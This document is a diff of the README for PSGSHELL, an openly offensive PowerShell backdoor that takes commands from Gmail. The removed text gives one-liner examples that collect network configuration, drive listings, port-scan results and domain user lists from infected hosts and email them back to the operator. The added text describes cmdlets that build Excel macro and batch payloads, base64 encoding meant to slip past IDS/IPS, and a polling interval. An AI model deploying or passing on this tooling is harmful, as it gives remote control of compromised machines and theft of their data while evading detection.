@@ -1,45 +1,33 @@
 # PSGSHELL
 
-New version in the base64 folder encodes the subject lines/commands to help thwart IDS/IPS's looking for such things.
+Version .0 Release
 
-Setup:
-Create a new gmail account for this and only this.
-Allow non-secure apps
+This version and all future versions will only support the base64 encoded messages.
 
-Both Scripts require that you set the email address and password variables at the top of the newly created gmail account.
+PSGSHELL is now a full Powershell Module, that includes the following CMDLETS. 
 
-Built for Powershell 2.0 (Win7) 
+#Setup and Installation
+All you need to download is the PSGSHELL.psm1 file to start having fun.
 
-syntax is: 
-To Return Output:
+You will need gmail account with insecure apps allowed.
 
-commander.ps1 '$variable = powershell oneliner; sendemail $variable ~host:host:host'
-
-Without Returning output:
-
-commander.ps1 'powershell oneliner ~host:host:host'
+#Send-PSGCommand -EmailAddress <test@gmail.com> -Password <password> -CLIENTLIST <11111:232245:432243:> -Command <Powershell V2 Command> 
 
 
-Examples: All One Liner commands
+Notes: All paramaters required. Client list should be separated by colons
 
-# Get IP address
-.\commander.ps1 '$var = ipconfig /all; sendemail $var ~123434'
 
-# List C drive contents and send them back to email
-.\commander.ps1 '$var = get-childitem c:\; sendmail $var ~123434'
+#New-PSGPayload -EmailAddress <test@gmail.com> -Password <password> -ClientID <ID For Client> -Type <macro or batch> -OutFile <full path to output>
 
-#port scan a host
-.\commander.ps1 '$var = 1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "$_ is open"; sendemail $var ~123434'
+Notes: ClientID should be a unique 6 character string. Macro will need to be copied from output file into excel. Batch script can also be powershell.
 
-# Get domain users (Net user /domain) but parsed for powershell output
-.\commander.ps1 '$output = net user /domain;$output = $output[6..($output.length-3)];$output = $output -split "\s+" ;$output = $output | ? {$_}; sendemail $output ~123434'
 
-# How it Works
-This script utilizes the GMAIL rss feed "https://mail.google.com/mail/feed/atom" and parses the subject lines of the emails. 
-The '~' is the delimiter between the powershell command at the front of the subject and the client names at the end.
 
-.\commander.ps1 '$var = ipconfig /all; sendemail $var ~123434:343454:32233'
+#How it Works
+PSGShell communicates using GMAIL. The Client parses the GMAIL RSS feed of the account and runs the commands in the subject line on the remote systems.
+The client then sends back the results of that command.
+The Default beacon time is 15 seconds, but can easily be changed by editing the "Start-Sleep -s 15" value to some other length.
+I plan on making this an option to specify when making payloads in the future.
 
-Currently the script accepts a single input that is the PS ONELINER, an optional sendmail, followed by the '~' and then $client_names which there can be multiple but should be seperated by colons.
-PSGSHELL.ps1 is the client or backdoor
-commander.ps1 is a script that sends the commands to the inbox (very simple)
+#Payloads
+The payloads all consist of a powershell single line commands removing the need to override execution policy.
